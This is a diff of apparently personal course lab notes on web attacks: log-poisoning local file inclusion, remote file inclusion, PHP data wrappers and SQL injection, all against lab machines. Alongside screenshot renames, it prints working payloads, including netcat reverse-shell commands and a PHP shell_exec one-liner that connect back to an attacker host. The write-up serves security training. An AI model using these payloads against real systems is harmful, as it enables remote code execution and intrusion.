@@ -65,7 +65,7 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 (note the `<pre>` tag meaning the line will be saved in its preformatted state, ignore breaks and spaces)
 
 Here we can see the command being injected into this log file.
-![[Screenshot_2022-06-09-07-25-12_1124x613.png]]
+![[log_poisoning.png]]
 - We then simply navigate to the vulnerable log file and call our newly injected function
 `http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
 ![[Screenshot_2022-06-09-07-24-43_1460x868.png]]
@@ -74,7 +74,7 @@ We can simply alter our URL to execute the following command:
 `nc -e cmd.exe 192.168.119.231 9001`
 After encoding, the full URL would resemble the following:
 `http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=nc%20-e%20cmd.exe%20192.168.119.231%209001`
-![[Screenshot_2022-06-09-07-38-06_886x459.png]]
+![[log_lfi_revshell.png]]
 
 # 9.8.7 Remote File Inclusion (RFI)
 
@@ -84,15 +84,15 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 
 1.  Exploit the RFI vulnerability in the web application and get a shell.
 We start by creating a malicious script to be hosted on our local machine
-![[Screenshot_2022-06-09-10-38-40_432x85.png]]
+![[rfi_malicious_file.png]]
 We then setup a python server to serve this malicious file.
 2.  Using /menu2.php?file=current_menu as a starting point, use RFI to get a shell.
 From there we request this malicious file via the URL of the vulnerable web application 
-![[Screenshot_2022-06-09-10-39-12_768x365.png]]
+![[lfi_whoami.png]]
 
 3.  Use one of the webshells i
 We can build on this by instead of issuing the command "whoami" we supply a url encoded reverse shell.
-![[Screenshot_2022-06-09-10-42-52_1013x396.png]]
+![[rfi_revshell.png]]
 
 # 9.8.10 PHP wrappers
 ## Practice - PHP Wrappers
@@ -106,7 +106,7 @@ We simply append the php wrapper `file=data:text/plain,hello world` to the end o
 2.  Use a PHP wrapper to get a shell on your Windows 10 lab machine.
 For this we replace the "hello world" at the end of our previous URL with a php script designed to execute code, we also place a reverse shell as our payload for the shell_exec to execute.
 `<?php echo shell_exec("nc -e cmd.exe 192.168.119.231 9001") ?>`
-![[Screenshot_2022-06-10-08-56-19_959x541.png]]
+![[shell_exec_revshell.png]]
 
 
 # 9.9.4 SQL Injection - Authentication Bypass
@@ -115,6 +115,8 @@ For this we replace the "hello world" at the end of our previous URL with a php 
 _(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_
 
 1.  Interact with the MariaDB database and manually execute the commands required to authenticate to the application. Understand the vulnerability.
+We can see that the malicious query is returning all user data, indicating that one of the "OR" arguments was satisfied. 
+![[mariadb_query.png]]
 
 2.  SQL inject the username field to bypass the login process.
 
